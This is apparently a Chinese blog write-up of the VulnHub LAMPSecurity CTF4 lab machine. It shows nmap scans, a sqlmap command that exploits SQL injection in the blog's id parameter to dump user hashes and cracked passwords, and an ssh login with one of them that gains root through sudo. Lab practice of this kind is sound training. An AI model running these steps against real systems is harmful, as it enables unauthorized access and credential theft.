---
title: 'VulnHub_01_LAMPSECURITY: CTF4'
date: 2022-02-16 
tags: VulnHub
categories: Technology
---

开始打vulnhub

download：`https://www.vulnhub.com/entry/lampsecurity-ctf4,83/`

扫描：

```sh
netdiscover
nmap -sT -sV -O 192.168.188.0/24
```

发现为`192.168.188.130`

nmap扫下：

>   nmap -A :检测操作系统和服务

```sh
┌──(root💀kali)-[/home/kali]
└─# nmap -A 192.168.188.130                                                                                                                                                                                                            130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-16 00:23 EST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 41.60% done; ETC: 00:23 (0:00:04 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 45.40% done; ETC: 00:23 (0:00:04 remaining)
Nmap scan report for 192.168.188.130
Host is up (0.00057s latency).
Not shown: 996 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
25/tcp  open   smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello [192.168.188.129], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP, 
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info 
80/tcp  open   http    Apache httpd 2.2.0 ((Fedora))
| http-robots.txt: 5 disallowed entries 
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-server-header: Apache/2.2.0 (Fedora)
|_http-title:  Prof. Ehks 
631/tcp closed ipp
MAC Address: 00:0C:29:28:D9:61 (VMware)
Device type: general purpose|proxy server|remote management|terminal server|switch|WAP
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (98%), SonicWALL embedded (95%), Control4 embedded (95%), Lantronix embedded (95%), SNR embedded (95%), Dell iDRAC 6 (94%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:sonicwall:aventail_ex-6000 cpe:/h:lantronix:slc_8 cpe:/h:snr:snr-s2960 cpe:/o:dell:idrac6_firmware cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel:4.1
Aggressive OS guesses: Linux 2.6.16 - 2.6.21 (98%), Linux 2.6.13 - 2.6.32 (96%), SonicWALL Aventail EX-6000 VPN appliance (95%), Control4 HC-300 home controller (95%), Lantronix SLC 8 terminal server (Linux 2.6) (95%), SNR SNR-S2960 switch (95%), Linux 2.6.8 - 2.6.30 (94%), Linux 2.6.9 - 2.6.18 (94%), Dell iDRAC 6 remote access controller (Linux 2.6) (94%), Linux 2.6.18 - 2.6.32 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.57 ms 192.168.188.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.98 seconds

```

开了22,25,80.

访问blog，url有注入，sqlmap直接跑。

```sh
sqlmap -u "http://192.168.188.130/index.html?page=blog&title=Blog&id=7%27" -D ehks -T user --dump
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+
```

ssh练了一次连不上，搜了下加个参数：

```sh
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 achen@192.168.188.130 
```

进去之后`sudo -l`，可以看到该用户可以执行root的所有命令，但是不是所有用户都可以，比如pmoore就不行



